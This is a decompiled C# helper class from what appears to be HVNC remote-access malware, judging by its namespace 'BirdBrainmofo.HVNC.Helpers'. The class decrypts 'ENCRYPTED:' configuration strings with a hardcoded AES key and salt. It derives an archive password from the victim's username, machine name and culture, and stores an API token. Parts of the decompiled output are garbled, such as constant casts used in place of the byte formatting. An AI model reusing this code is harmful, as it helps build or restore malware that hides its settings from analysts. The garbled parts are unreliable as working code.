using System;
using System.IO;
using System.Linq;
using System.Runtime.CompilerServices;
using System.Security.Cryptography;
using System.Text;

namespace BirdBrainmofo.HVNC.Helpers
{
	// Token: 0x020000E8 RID: 232
	internal sealed class StringsCrypt
	{
		// Token: 0x060008F8 RID: 2296 RVA: 0x00061AE4 File Offset: 0x0005FCE4
		public static string GenerateRandomData(string string_0 = "0")
		{
			string text = string_0;
			if (string_0 == "0")
			{
				DateTime dateTime = DateTime.Parse(SystemInfo.Datenow);
				text = dateTime.Ticks.ToString();
			}
			string text2 = string.Concat(text, "-", SystemInfo.Username, "-", SystemInfo.Compname, "-", SystemInfo.Culture, "-", "Intel(R) Core(TM) i7-10750H CPU @ 2.60GHz", "-", "NVIDIA GeForce RTX 2060");
			string text3;
			using (MD5 md = MD5.Create())
			{
				text3 = string.Join("", md.ComputeHash(Encoding.UTF8.GetBytes(text2)).Select(delegate(byte byte_0)
				{
					byte b = byte_0;
                    byte ptr = unchecked((byte)-1250693555);
					string text4 = (-1250696128).ToString();
					return ptr.ToString(text4);
				}));
			}
			return text3;
		}

		// Token: 0x060008F9 RID: 2297 RVA: 0x00061BF0 File Offset: 0x0005FDF0
		public static string Decrypt(byte[] bytesToBeDecrypted)
		{
			byte[] bytes = Encoding.Default.GetBytes(";&KF!M!h8^iT:<)a?~mXeN*~o?gN[v@rQ=B");
			byte[] bytes2 = Encoding.Default.GetBytes("f3o3K-11=G-N7VJtozOWRr=(tNZBfK+bS7Fy");
			byte[] array;
			using (MemoryStream memoryStream = new MemoryStream())
			{
				using (RijndaelManaged rijndaelManaged = new RijndaelManaged())
				{
					rijndaelManaged.KeySize = 256;
					rijndaelManaged.BlockSize = 128;
					Rfc2898DeriveBytes rfc2898DeriveBytes = new Rfc2898DeriveBytes(bytes, bytes2, 1000);
					rijndaelManaged.Key = rfc2898DeriveBytes.GetBytes(rijndaelManaged.KeySize / 8);
					rijndaelManaged.IV = rfc2898DeriveBytes.GetBytes(rijndaelManaged.BlockSize / 8);
					rijndaelManaged.Mode = CipherMode.CBC;
					using (CryptoStream cryptoStream = new CryptoStream(memoryStream, rijndaelManaged.CreateDecryptor(), CryptoStreamMode.Write))
					{
						cryptoStream.Write(bytesToBeDecrypted, 0, bytesToBeDecrypted.Length);
						cryptoStream.Close();
					}
					array = memoryStream.ToArray();
				}
			}
			return Encoding.UTF8.GetString(array);
		}

		// Token: 0x060008FA RID: 2298 RVA: 0x00061D10 File Offset: 0x0005FF10
		public static string DecryptConfig(string value)
		{
			string text;
			if (string.IsNullOrEmpty(value))
			{
				text = "";
			}
			else if (!value.StartsWith("ENCRYPTED:"))
			{
				text = value;
			}
			else
			{
				text = Decrypt(Convert.FromBase64String(value.Replace("ENCRYPTED:", "")));
			}
			return text;
		}

		// Token: 0x060008FB RID: 2299 RVA: 0x00061D60 File Offset: 0x0005FF60
		public StringsCrypt()
		{
		}

		// Token: 0x060008FC RID: 2300 RVA: 0x0000ACED File Offset: 0x00008EED
		// Note: this type is marked as 'beforefieldinit'.
		static StringsCrypt()
		{
		}

		// Token: 0x04000744 RID: 1860
		public static string ArchivePassword = GenerateRandomData();

		// Token: 0x04000745 RID: 1861
		private byte[] SaltBytes = Encoding.Default.GetBytes("f3o3K-11=G-N7VJtozOWRr=(tNZBfK+bS7Fy");

		// Token: 0x04000746 RID: 1862
		private byte[] CryptKey = Encoding.Default.GetBytes(";&KF!M!h8^iT:<)a?~mXeN*~o?gN[v@rQ=B");

		// Token: 0x04000747 RID: 1863
		private byte[] ApiKey = Encoding.Default.GetBytes("?token=0429cbf2316b8e33");

		// Token: 0x020000E9 RID: 233
		[CompilerGenerated]
		[Serializable]
		private sealed class cccc
		{
			// Token: 0x060008FD RID: 2301 RVA: 0x0000ACFE File Offset: 0x00008EFE
			// Note: this type is marked as 'beforefieldinit'.
			static cccc()
			{
			}

			// Token: 0x060008FE RID: 2302 RVA: 0x00006F52 File Offset: 0x00005152
			public cccc()
			{
			}

			// Token: 0x060008FF RID: 2303 RVA: 0x00061DB4 File Offset: 0x0005FFB4
			internal string GenerateRandomData_40(byte byte_0)
			{
				byte b = byte_0;
                byte ptr = unchecked((byte)-1250693555);
				string text = (-1250696128).ToString();
				return ptr.ToString(text);
			}

			// Token: 0x04000748 RID: 1864
			public static readonly StringsCrypt.cccc ccc9 = new StringsCrypt.cccc();

			// Token: 0x04000749 RID: 1865
			public static Func<byte, string> ccc9__4_0;
		}
	}
}
